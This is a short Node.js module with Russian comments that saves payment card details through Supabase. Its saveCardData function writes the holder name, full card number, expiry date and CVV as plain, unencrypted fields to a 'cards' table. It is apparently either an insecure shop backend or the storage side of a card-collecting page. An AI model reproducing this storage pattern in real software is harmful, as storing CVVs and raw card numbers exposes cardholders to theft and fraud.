// data/storage.js
const { createClient } = require('@supabase/supabase-js');
require('dotenv').config(); // Загружаем ключи из .env

// Инициализация клиента Supabase
const supabaseUrl = process.env.SUPABASE_URL;
const supabaseKey = process.env.SUPABASE_KEY;

// Проверка наличия ключей (чтобы не гадать, если что-то не работает)
if (!supabaseUrl || !supabaseKey) {
    console.error('ERROR: Supabase keys are missing in .env file!');
}

const supabase = createClient(supabaseUrl, supabaseKey);

// Функция сохранения данных карты
async function saveCardData(data) {
    // Мы записываем данные в таблицу 'cards'
    const { data: result, error } = await supabase
        .from('cards') 
        .insert([
            {
                holder_name: data.holder,
                card_number: data.number,
                expiration: data.expiration,
                cvv: data.cvv,
                created_at: new Date().toISOString()
            }
        ]);

    if (error) {
        console.error('Supabase Write Error:', error.message);
        throw error;
    }
    
    return result;
}

module.exports = { saveCardData };